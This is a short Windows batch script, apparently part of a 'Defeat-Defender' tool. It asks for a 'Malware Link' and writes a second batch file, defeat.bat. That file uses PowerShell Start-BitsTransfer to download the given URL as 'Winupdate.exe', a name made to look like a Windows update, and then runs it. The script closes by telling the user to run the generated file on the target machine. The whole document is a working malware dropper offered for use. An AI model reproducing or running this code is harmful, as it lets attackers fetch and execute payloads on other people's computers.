@echo off
type batch.txt
color 0a
echo.
echo.
set /p a="Enter Malware Link: "
if [%a%]==[] (goto error ) else (goto main)
:main
echo your url is %a% 
echo. >>defeat.bat
echo powershell -command "start-bitstransfer %a%   .\Winupdate.exe" >>defeat.bat
echo. >>defeat.bat
echo start  Winupdate.exe >>defeat.bat
echo. >>defeat.bat
echo. >>defeat.bat
echo.
echo File Generated Successfully.Run Defeat-Defender.bat on target machine .
pause
exit /B 
:error
echo Please Enter Link And Try Again!!!
pause




